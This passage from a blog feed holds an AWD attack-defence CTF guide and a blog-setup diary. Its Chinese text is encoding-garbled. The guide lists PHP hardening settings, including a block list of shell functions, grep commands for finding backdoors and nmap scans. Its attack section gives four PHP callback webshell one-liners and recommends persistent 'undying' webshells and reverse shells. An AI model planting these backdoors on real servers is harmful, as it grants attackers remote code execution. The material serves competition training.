attr-name\">\".+\\.ph(p[3457]?|t|tml)$\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>deny from all</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>FilesMatch</span><span class=\"token punctuation\">></span></span>  //è¿™ä¸‰è¡Œå‘½ä»¤ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…äº†ä»¥ .phpã€.phtmlã€.php3ã€.phtã€.php4ã€.php5ã€.php7ã€.shtml ç»“å°¾çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶è®¿é—®æƒé™è®¾ç½®ä¸ºæ‹’ç»æ‰€æœ‰</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Directory</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure></div></details>\n<h3 id=\"phpå‚æ•°å®‰å…¨é…ç½®\"><a class=\"anchor\" href=\"#phpå‚æ•°å®‰å…¨é…ç½®\">#</a> php å‚æ•°å®‰å…¨é…ç½®</h3>\n<p>åœ¨ <code>/etc/php7.2.1/php.ini</code>  ä¸‹</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>ç¦ç”¨é«˜å±å‡½æ•°</strong></p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>disable_functions </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>disable_functions &#x3D; system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>é…ç½® open_basedir</strong> ï¼ˆå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸï¼‰</p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>ç¦ç”¨é­”æœ¯å¼•å·</strong>ï¼ˆè‡ªåŠ¨å¯¹å¤–éƒ¨æ¥æºæ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œé˜²æ­¢ SQL æ³¨å…¥ï¼‰</p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>magic_quotes_gpc &#x3D; Off</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>å…³é—­ PHP ä¼ªåè®®</strong></p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>allow_url_fopen &#x3D; Off</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>allow_url_include &#x3D; Off</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>é‡å¯ PHP</strong></p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> php7.0-fpm restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart php7.0-fpm.service</pre></td></tr></table></figure><h3 id=\"waféƒ¨ç½²\"><a class=\"anchor\" href=\"#waféƒ¨ç½²\">#</a> waf éƒ¨ç½²</h3>\n<p><a href=\"https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/\">è„šæœ¬ä¼ é€é—¨</a><br />\n php.ini é€‰é¡¹ï¼šauto_prepend_file = ä¸ auto_append_file =waf.php</p>\n<p>waf è„šæœ¬ï¼Œ<a href=\"https://github.com/sharpleung/CTF-WAF\">é¡¹ç›®æˆ³è¿™é‡Œ</a>ï¼Œ<a href=\"http://t.csdnimg.cn/y4KoJ\"> éƒ¨ç½²çœ‹è¿™é‡Œ</a><br />\n WatchBrid é€šé˜²ä¸å…è®¸ç”¨äºæ¯”èµ›ï¼Œç¬¬ä¸‰æ–¹é€šé˜²å‚è€ƒæ¯”èµ›è§„åˆ™<br />\n<a href=\"https://github.com/DasSecurity-HatLab/AoiAWD\"> AoiAWD æˆ³è¿™é‡Œ</a><br />\n<a href=\"https://www.freebuf.com/sectool/234402.html\"> WatchBrid é˜²ç«å¢™æˆ³è¿™é‡Œ</a></p>\n<h3 id=\"phpä»£ç å®¡è®¡\"><a class=\"anchor\" href=\"#phpä»£ç å®¡è®¡\">#</a> php ä»£ç å®¡è®¡</h3>\n<p>æ‰«æé¢„ç•™åé—¨ï¼Œæ‰«æç›®å½•ï¼Œå¯»æ‰¾åé—¨ï¼Œæ³¨é‡Šä»£ç <br />\n cms æ¡†æ¶çš„ cveã€å¸¸è§çš„æ¼æ´ç­‰</p>\n<div class=\"note success\">\n<p>è¿™éƒ¨åˆ†éœ€è¦è¿›æ”»é˜²å®ˆåŒæ—¶è¿›è¡Œï¼Œå®¡è®¡å‡ºæ¼æ´ååˆ†å·¥ï¼Œä¸€äººè¡¥ wafã€æ³¨é‡Šä»£ç ï¼Œä¸€äººå†™è„šæœ¬ã€å†™ payload<br />\n å…·ä½“æ”¾åœ¨ attack éƒ¨åˆ†è®²è§£ã€‚</p>\n</div>\n<h3 id=\"è¿œç¨‹ç™»å½•åŠ å›º\"><a class=\"anchor\" href=\"#è¿œç¨‹ç™»å½•åŠ å›º\">#</a> è¿œç¨‹ç™»å½•åŠ å›º</h3>\n<p>æš‚æ—¶ç”¨ä¸åˆ°ï¼Œé‡åˆ°å†è¡¥å……</p>\n<h3 id=\"è®¾ç½®ç¦ping\"><a class=\"anchor\" href=\"#è®¾ç½®ç¦ping\">#</a> è®¾ç½®ç¦ Ping</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //ä¸´æ—¶å¼€å¯ç¦ping</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"0\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //å…³é—­ç¦ping</pre></td></tr></table></figure><h1 id=\"è¿›æ”»attack\"><a class=\"anchor\" href=\"#è¿›æ”»attack\">#</a> è¿›æ”»ï¼ˆattackï¼‰</h1>\n<div class=\"note danger\">\n<p>ä¸€å®šè¦åœ¨å‰å‡ è½®è„šæœ¬æ‰¹é‡è·å–åˆ†æ•°ï¼Œåˆ°åé¢åŸºæœ¬ä¸Šæ˜¯æ‰“å¡ä¸‹ç­äº†</p>\n</div>\n<h2 id=\"ä»£ç å®¡è®¡\"><a class=\"anchor\" href=\"#ä»£ç å®¡è®¡\">#</a> ä»£ç å®¡è®¡</h2>\n<div class=\"note warning\">\n<p>å„ä¸ªé¶æœºæœåŠ¡ç›¸åŒï¼Œå¯ä»¥å…ˆåœ¨ä¸»æœºä»£ç å®¡è®¡ï¼Œå¯»æ‰¾ç®€å•æ¼æ´ã€‚ç”±æ˜“åˆ°éš¾ã€‚</p>\n</div>\n<p>æ‰«æé¢„ç•™åé—¨ï¼Œæ‰«æç›®å½•ï¼Œå¯»æ‰¾åé—¨ï¼Œæ³¨é‡Šä»£ç </p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ç®€å•çš„æŸ¥æ‰¾åé—¨ ï¼ˆä¸å»ºè®®ï¼‰</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'eval('</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'assert('</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'system('</span></pre></td></tr></table></figure><p><span class=\"red\"><strong>æ¨è</strong></span><br />\næ‰“å¼€ D ç›¾ / å®‰å…¨ç‹— / æ²³é©¬æŸ¥æ€ï¼Œå°† html æ–‡ä»¶å¤¹ç›´æ¥æ‹–å…¥</p>\n<p>seay æºä»£ç å®¡è®¡ï¼Œæˆ–è€… Rips ä»£ç å®¡è®¡<br />\n<a href=\"https://blog.csdn.net/qq_43442524/article/details/101934481\">å·¥å…·</a></p>\n<h2 id=\"metasploitå·¥å…·\"><a class=\"anchor\" href=\"#metasploitå·¥å…·\">#</a> Metasploit å·¥å…·</h2>\n<p><a href=\"\">æ’ä¸ªçœ¼</a>ï¼Œåç»­è¡¥ä¸Š</p>\n<h2 id=\"nmapæ‰«æå·¥å…·\"><a class=\"anchor\" href=\"#nmapæ‰«æå·¥å…·\">#</a> nmap æ‰«æå·¥å…·</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/å­ç½‘æ©ç </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># æ‰«æä¸»æœºæ‰€æœ‰ç«¯å£</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-Pn</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-A</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr></table></figure><p>è¿™é‡Œæ”¾ä¸€äº›å¸¸ç”¨çš„ nmap å‘½ä»¤ï¼Œæ›´å¤šéœ€æ±‚<a href=\"https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/\">æˆ³è¿™é‡Œ</a></p>\n<blockquote>\n<p>å­¦ä¼šè¯»å®˜æ–¹è¯´æ˜æ–‡æ¡£çœŸçš„å¾ˆé‡è¦ï¼Œæ¯”èµ·ç›´æ¥çœ‹åˆ«äººå†™å¥½çš„æ•™ç¨‹ï¼Œä¼šå¯¹å·¥å…·çš„ç”¨æ³•æœ‰æ›´æ·±çš„ç†è§£ã€‚<a href=\"https://nmap.org/man/zh/index.html\">nmap ä¸­æ–‡æ–‡æ¡£</a></p>\n</blockquote>\n<h2 id=\"æƒé™ç»´æŒ\"><a class=\"anchor\" href=\"#æƒé™ç»´æŒ\">#</a> æƒé™ç»´æŒ</h2>\n<p>æ‹¿åˆ° WEBSHELL åï¼Œéœ€è¦ç»´æŒæƒé™ï¼ç®€å•çš„ WEBSHELL ä¸€çœ¼å°±ä¼šè¢«è¯†åˆ«ï¼Œåœ¨ AWD ä¸­ä¼˜å…ˆè€ƒè™‘ç§ä¸æ­»é©¬ã€åå¼¹ SHELL ç­‰ç•™åé—¨æ–¹å¼ç»´æŒæƒé™ï¼Œä»¥ä¾¿åç»­åˆ· FLAGï¼Œå†è€ƒè™‘æå‡æƒé™ã€‚</p>\n<h3 id=\"å…³äºåå¼¹shell\"><a class=\"anchor\" href=\"#å…³äºåå¼¹shell\">#</a> å…³äºåå¼¹ shell</h3>\n<p>æ€ä¹ˆå†™æ€ä¹ˆè—æ€ä¹ˆå‘ç°ï¼Œä¹°äº†æœåŠ¡å™¨å†å­¦ hhhhhğŸ¥±ğŸ¥±</p>\n<h3 id=\"è—flagæŠ€æœ¯å“ªå®¶å¼º\"><a class=\"anchor\" href=\"#è—flagæŠ€æœ¯å“ªå®¶å¼º\">#</a> è— flag æŠ€æœ¯å“ªå®¶å¼º</h3>\n<div class=\"note warning\">\n<p>ç¬¬ä¸€æ¬¡ getshell ä¹‹åä¸èƒ½å¾—æ„ï¼Œæƒé™çš„ç»´æŒæ—¶é—´æœ‰é™ï¼Œå¦‚æœèƒ½æŠŠ flag è—åœ¨æŸå¤„æŒç»­å¾—åˆ†æ‰æ˜¯å¤§å¤´ä»»åŠ¡</p>\n</div>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag:'</span><span class=\"token operator\">.</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>æ¡ä»¶å…è®¸çš„è¯ï¼Œå°† flag ä¿¡æ¯ç›´æ¥è¯»å–å¹¶è¿”å›åˆ° header å¤´ä¸­ï¼Œè¿™æ ·åšä¸æ˜“è¢«å‘ç°ã€‚</p>\n<h3 id=\"è—åé—¨çš„nç§æ–¹å¼\"><a class=\"anchor\" href=\"#è—åé—¨çš„nç§æ–¹å¼\">#</a> è—åé—¨çš„ n ç§æ–¹å¼</h3>\n<p>ç›´æ¥æ”¾ä¸Š p ç¥çš„æ–‡ç« ï¼Œè†œæ‹œä¸€ä¸‹</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html\">åˆ›é€  tips çš„ç§˜ç± â€”â€”PHP å›è°ƒåé—¨ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p>\n<details class=\"info\"><summary>ğŸ‘‡æ•´ç†äº†ä¸€ä¸‹åé—¨çš„è„šæœ¬</summary><div>\n<p>æ–‡ç« å‘å¸ƒè‡ª 2015 å¹´ï¼Œç›®å‰å„å¤§ waf éƒ½æœ‰äº†ä¿®è¡¥ï¼Œå‚è€ƒç€ä½¿ç”¨å§ï¼Œè„šæœ¬åªåšæ¬è¿ï¼Œè®¤çœŸæ‹œè¯»</p>\n<p><mark>å•å‚æ•°åé—¨çš„ç»ˆæå¥¥ä¹‰</mark></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">register_shutdown_function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span><span class=\"token punctuation\">(</span>ticks<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">register_tick_function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var_array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'filter'</span> <span class=\"token operator\">=></span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>è¿‡å»é‚£ä¹ˆä¹…äº†ï¼Œphp ä¹Ÿåˆ°äº† 8.1 çš„ç‰ˆæœ¬ï¼Œåç»­æœ‰ç©ºæµ‹è¯•ä¸€ä¸‹è¿™äº›åé—¨è¿˜èƒ½ç”¨ä¸</p>\n</div></details>\n<h4 id=\"å…³äºä¸æ­»é©¬\"><a class=\"anchor\" href=\"#å…³äºä¸æ­»é©¬\">#</a> å…³äºä¸æ­»é©¬</h4>\n<p><a href=\"\">ä¼ é€é—¨</a></p>\n<p>ä¸æ­»é©¬å¯ä»¥æƒé™ç»´æŒï¼Œå¹¶ä¸”ç»§ç»­å¾€æœåŠ¡å™¨å†™å…¥æ›´å¤šçš„é©¬ï¼Œä¸è¦ä»…é™äº getflag</p>\n<h1 id=\"ä¸€äº›æ‰¹é‡è„šæœ¬\"><a class=\"anchor\" href=\"#ä¸€äº›æ‰¹é‡è„šæœ¬\">#</a> ä¸€äº›æ‰¹é‡è„šæœ¬</h1>\n<p>æ­£åœ¨æ”¶é›† ing~~~ï¼Œç­‰å¾…æ›´æ–°</p>\n<h1 id=\"å‚è€ƒæ–‡ç« \"><a class=\"anchor\" href=\"#å‚è€ƒæ–‡ç« \">#</a> å‚è€ƒæ–‡ç« ï¼š</h1>\n<p><a href=\"https://forum.butian.net/share/2536\">https://forum.butian.net/share/2536</a><br />\n<a href=\"https://www.cnblogs.com/qianfu/p/17530955.html\">https://www.cnblogs.com/qianfu/p/17530955.html</a><br />\n<a href=\"http://t.csdnimg.cn/7nF7a\">http://t.csdnimg.cn/7nF7a</a><br />\n<a href=\"https://www.cnblogs.com/liang2580/p/9147806.html\">https://www.cnblogs.com/liang2580/p/9147806.html</a><br />\n<a href=\"https://github.com/AabyssZG/AWD-Guide\">https://github.com/AabyssZG/AWD-Guide</a><br />\n<a href=\"http://t.csdnimg.cn/ucKKL\">http://t.csdnimg.cn/ucKKL</a></p>\n",
            "tags": [
                "AWD",
                "Attack and Defence",
                "kali tools"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "url": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "title": "æ­åšå®¢ä¸€è·¯çš„å¿ƒé…¸",
            "date_published": "2024-04-10T03:50:46.000Z",
            "content_html": "<p>ä¸€å¼€å§‹ä¸€çœ¼ç›¸ä¸­äº† shoka ä¸»é¢˜çš„æ ·å¼ï¼Œè°æ–™åˆ°åæ¥æ¬çŸ³å¤´ç ¸äº†è‡ªå·±çš„è„šã€‚<br />\néƒ¨ç½²åˆ°ä¸€åŠå‘ç° shoka æœ‰äº†å‡çº§ç‰ˆ shokaXï¼Œåªå¾—é‡æ–°æ¥è¿‡<br />\néšå <code>npm install</code>  åå¤æŠ¥é”™ï¼ŒçœŸæ˜¯å¤´å¤§<br />\nåœ¨é…ç½®å›¾ç‰‡æ—¶å€™åˆå‘ç°ç”¨ images.yml çš„ç›¸å¯¹è·¯å¾„åŠ è½½ä¸åˆ°ã€‚<br />\næ¢äº†å›¾åºŠå images.yml ä¹Ÿæ²¡åŠ è½½æˆåŠŸâ€¦â€¦ğŸ˜‘ğŸ˜°</p>\n<h1 id=\"å‚»æ‰çš„æ˜¯æˆ‘ä¸æ˜¯git-bash\"><a class=\"anchor\" href=\"#å‚»æ‰çš„æ˜¯æˆ‘ä¸æ˜¯git-bash\">#</a> å‚»æ‰çš„æ˜¯æˆ‘ï¼Œä¸æ˜¯ git bash</h1>\n<p>ç¬¬ä¸€ä¸ªæ‹¦è·¯è™å°±æ˜¯<strong> hexo init</strong><br />\n å¡ä½äº†æ— æ•°æ¬¡â€¦â€¦ è€å¿ƒä¸å¤Ÿç”¨äº†ï¼Œéƒ½æ€€ç–‘æ˜¯ä¸æ˜¯ git bash åæ‰äº†<br />\næœ€åæ¢æºå† <code>npm hexo init</code> <br />\n é•¿èˆ’ä¸€å£æ°”</p>\n<p>åœ¨å®‰è£…å‰å·²ç»ä¿®æ”¹äº† nodejs çš„æƒé™é—®é¢˜</p>\n<h1 id=\"powershellçš„è„šæœ¬è¿è¡Œé—®é¢˜\"><a class=\"anchor\" href=\"#powershellçš„è„šæœ¬è¿è¡Œé—®é¢˜\">#</a> powershell çš„è„šæœ¬è¿è¡Œé—®é¢˜</h1>\n<p>è‹¥ç›´æ¥è¿è¡Œ hexo ä¼šæŠ¥è¿™æ ·çš„é”™è¯¯<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-2.png\" alt=\"err\" /></p>\n<p>è®¾ç½® - ç³»ç»Ÿ - å¼€å‘è€…é€‰é¡¹<br />\n &quot;å…è®¸æœ¬åœ° powershell è„šæœ¬åœ¨æœªç­¾åçš„æƒ…å†µä¸‹å…è®¸&quot; é€‰æ‹©å¼€å¯<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-1.png\" alt=\"è®¾ç½®-ç³»ç»Ÿ-å¼€å‘è€…é€‰é¡¹\" /></p>\n<h1 id=\"èº²ä¸æ‰çš„è¿˜æ˜¯npm-err\"><a class=\"anchor\" href=\"#èº²ä¸æ‰çš„è¿˜æ˜¯npm-err\">#</a> èº²ä¸æ‰çš„è¿˜æ˜¯ npm ERRï¼</h1>\n<p><img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-3.png\" alt=\"&quot;æ¯æ¬¡npm installæ—¶çš„å™©æ¢¦&quot;\" title=\"npm ERR! Cannot read properties of null (reading 'matches')\" /><br />\n<strong>npm ERR! Cannot read properties of null (reading 'matches')</strong><br />\n ç½‘ä¸Šé¢å¯¹è¿™ä¸ªæŠ¥é”™çš„åšæ³•æ˜¯</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> cache clean <span class=\"token parameter variable\">--force</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>æˆ–è€…äºŒå‚»å­GPTè¯´</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> <span class=\"token function\">npm</span></pre></td></tr></table></figure><p>ä¹Ÿæœ‰çš„è¯´åˆ é™¤ <code>package-lock.json</code>  åˆ é™¤ <code>node-modules</code>  çš„ï¼Œä½†æ˜¯æ²¡æœ‰ lockâ€¦â€¦<br />\n å°è¯•äº†æ¢æºï¼Œä¼¼ä¹è¿˜æ˜¯æ²¡ä»€ä¹ˆåµç”¨â€¦â€¦<br />\n æœ€åç”¨ cnpm æ‰æˆåŠŸä¸‹è½½â€¦â€¦ğŸ’”</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> cnpm</pre></td></tr></table></figure><p>å‘½ä»¤ä¸¢è¿™ä¸‹æ¬¡å¥½æ‹¿ (cnpm æ¢æºçš„å‘½ä»¤ç›¸åŒ)</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">npm</span> å®˜æ–¹é•œåƒç½‘å€:   https://registry.npmjs.org/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>æ·˜å® NPM é•œåƒï¼š     https://registry.npm.taobao.org</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>é˜¿é‡Œäº‘ NPM é•œåƒï¼š   https://npm.aliyun.com</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>è…¾è®¯äº‘ NPM é•œåƒï¼š   https://mirrors.cloud.tencent.com/npm/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>åä¸ºäº‘ NPM é•œåƒï¼š   https://mirrors.huaweicloud.com/repository/npm/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ç½‘æ˜“ NPM é•œåƒï¼š     https://mirrors.163.com/npm/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¼€æºé•œåƒç«™ï¼šhttp://mirrors.ustc.edu.cn/</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>æ¸…åå¤§å­¦å¼€æºé•œåƒç«™ï¼šhttps://mirrors.tuna.tsinghua.edu.cn/</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>è…¾è®¯ï¼Œåä¸ºï¼Œé˜¿é‡Œçš„é•œåƒç«™åŸºæœ¬ä¸Šæ¯”è¾ƒå…¨</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config <span class=\"token builtin class-name\">set</span> registry <span class=\"token punctuation\">[</span>url<span class=\"token 